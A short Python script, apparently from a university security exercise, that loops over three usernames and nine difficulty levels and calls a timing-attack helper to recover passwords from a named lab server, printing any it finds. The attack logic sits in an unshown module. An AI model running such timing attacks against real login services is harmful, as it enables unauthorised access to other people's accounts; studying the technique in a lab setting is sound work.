import sys
import Utils

levels = [i for i in range(1, 10)]
users = ['avivams', 'curiey', 'adirbir']

for lvl in levels:
    for usr in users:
# if len(sys.argv) == 3:
#
#     difficulty = sys.argv[2]
#     username = sys.argv[1]
        try:
            difficulty = lvl
            username = usr

            start_url = f"http://aoi.ise.bgu.ac.il/?user={username}&password="
            end_url = f"&difficulty={difficulty}"

            password = Utils.timing_attack(start_url=start_url, end_url=end_url)

            if password:
                print(f"[main][{usr}][{lvl}]: {password}")

        except Exception as e:
            print(e)
